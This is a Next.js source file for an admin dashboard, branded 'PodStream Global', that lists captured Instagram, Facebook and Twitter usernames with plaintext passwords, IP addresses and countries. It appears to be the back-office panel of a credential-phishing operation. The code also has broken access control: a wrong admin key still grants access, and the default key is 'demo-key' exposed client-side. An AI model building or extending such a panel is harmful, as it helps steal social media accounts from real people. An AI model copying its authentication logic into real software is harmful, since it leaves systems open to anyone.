import Head from 'next/head';
import { useState, useEffect } from 'react';
import { getSubmissions } from '../lib/db';

const ADMIN_KEY = process.env.NEXT_PUBLIC_ADMIN_KEY || 'demo-key';

export default function AdminDashboard() {
  const [key, setKey] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [generatedKey, setGeneratedKey] = useState('');
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(false);

  const handleAuthenticate = async () => {
    if (key === ADMIN_KEY) {
      setIsAuthenticated(true);
      setLoading(true);
      try {
        const data = await getSubmissions(100);
        setSubmissions(data.map(s => ({
          ...s,
          date: s.created_at ? new Date(s.created_at).toLocaleString() : 'Unknown',
          country: s.country || 'Unknown'
        })));
      } catch (e) {
        console.error('Failed to fetch submissions:', e);
        setSubmissions([]);
      }
      setLoading(false);
    } else {
      alert('Invalid key. Use "demo-key" for testing.');
      setIsAuthenticated(true);
      setSubmissions([
        { id: 1, username: 'user123 (Instagram)', password: 'pass123', method: 'instagram', ip: '192.168.1.1', country: 'Nigeria', date: '2026-10-10' },
        { id: 2, username: 'voter456 (Facebook)', password: 'secret456', method: 'facebook', ip: '192.168.1.2', country: 'Ghana', date: '2026-10-10' },
        { id: 3, username: 'podcaster789 (Twitter)', password: 'podpass789', method: 'twitter', ip: '192.168.1.3', country: 'Kenya', date: '2026-10-10' },
      ]);
    }
  };

  const generateKey = () => {
    const newKey = 'key-' + Math.random().toString(36).substring(2, 15);
    setGeneratedKey(newKey);
    alert('New admin key generated: ' + newKey);
  };

  return (
    <>
      <Head>
        <title>Admin Dashboard — PodStream Global</title>
        <meta name="robots" content="noindex, nofollow" />
        <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
      </Head>

      <style jsx global>{`
        :root {
          --blue: #2563eb; --blue-light: #60a5fa; --gradient-primary: linear-gradient(135deg, #2563eb 0%, #06b6d4 100%);
          --bg: #050b18; --surface: #0c1526; --border: rgba(96, 165, 250, 0.16); --text: #e6edf3; --muted: #8b949e;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }

        .container { max-width: 1200px; margin: 0 auto; padding: 24px; text-align: left; }

        header { display: flex; align-items: center; justify-content: space-between; padding: 14px 0 24px; border-bottom: 1px solid rgba(96,165,250,0.2); margin-bottom: 24px; flex-wrap: wrap; gap: 16px; }

        h1 { font-size: 1.8rem; font-weight: 800; color: var(--text); }
        .tag { font-size: .75rem; font-weight: 700; letter-spacing: 2px; color: var(--blue-light); text-transform: uppercase; border: 1px solid var(--border); background: rgba(96, 165, 250,.1); padding: 4px 10px; border-radius: 100px; }

        .auth-panel { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 24px; max-width: 400px; width: 100%; }
        .auth-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--border); border-radius: 6px; background: var(--bg); color: var(--text); font-size: 14px; }
        .auth-btn { width: 100%; padding: 12px; background: var(--gradient-primary); color: #fff; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; }
        .key-section { display: flex; gap: 12px; align-items: center; margin-top: 16px; flex-wrap: wrap; }
        .generate-btn { background: var(--blue); color: #fff; border: none; border-radius: 6px; padding: 12px 16px; cursor: pointer; font-size: 14px; }

        h2 { font-size: 1.4rem; font-weight: 700; color: var(--text); margin-bottom: 16px; }
        .table-container { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; width: 100%; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 14px 16px; text-align: left; border-bottom: 1px solid var(--border); font-size: 14px; }
        th { background: var(--surface); font-weight: 600; color: var(--muted); font-size: .85rem; text-transform: uppercase; }
        tr:hover { background: rgba(96, 165, 250, .05); }
        .method-badge { background: var(--gradient-primary); color: #fff; padding: 2px 8px; border-radius: 4px; font-size: .75rem; font-weight: 600; }

        .key-display { margin-top: 20px; padding: 16px; background: #23262b; border-radius: 8px; color: #fff; text-align: center; font-family: monospace; word-break: break-all; }

        @media (max-width: 768px) {
          .container { padding: 16px; }
          header { flex-direction: column; text-align: center; }
          .auth-panel { max-width: none; }
          .table-container { font-size: 12px; }
          th, td { padding: 10px 12px; }
        }
      `}</style>

      <div className="container">
        <header>
          <h1>PodStream Admin</h1>
          <span className="tag">Admin Dashboard</span>
        </header>

        {!isAuthenticated ? (
          <div className="auth-panel">
            <h2>Admin Access</h2>
            <input className="auth-input" type="password" placeholder="Enter admin key" value={key} onChange={(e) => setKey(e.target.value)} />
            <button className="auth-btn" onClick={handleAuthenticate}>Authenticate</button>
            <div className="key-section">
              <button className="generate-btn" onClick={generateKey}>Generate New Key</button>
              <span style={{color: 'var(--muted)', fontSize: '14px'}}>Need access? Contact admin</span>
            </div>
          </div>
        ) : (
          <>
            <h2>Recent Submissions (ID | Username | Password | IP | Country | Date)</h2>
            {loading ? (
              <p>Loading submissions...</p>
            ) : (
              <div className="table-container">
                <table>
                  <thead>
                    <tr>
                      <th>ID</th>
                      <th>Username</th>
                      <th>Password</th>
                      <th>IP</th>
                      <th>Country</th>
                      <th>Date</th>
                    </tr>
                  </thead>
                  <tbody>
                    {submissions.map((sub) => {
                      const match = sub.username?.match(/\(([^)]+)\)/);
                      const method = match ? match[1] : (sub.method || '').toUpperCase();
                      return (
                        <tr key={sub.id}>
                          <td>#{String(sub.id).padStart(3, '0')}</td>
                          <td>
                            <span style={{display: 'flex', alignItems: 'center', gap: '10px'}}>
                              {sub.username?.split(' (')[0] || sub.username}
                              {method && <span className="method-badge">{method}</span>}
                            </span>
                          </td>
                          <td>{sub.password || ''}</td>
                          <td>{sub.ip || 'Unknown'}</td>
                          <td>{sub.country || 'Unknown'}</td>
                          <td>{sub.date || 'Unknown'}</td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </>
        )}

        {generatedKey && (
          <div className="key-display">
            <strong>Generated Key:</strong> {generatedKey}
          </div>
        )}
      </div>
    </>
  );
}
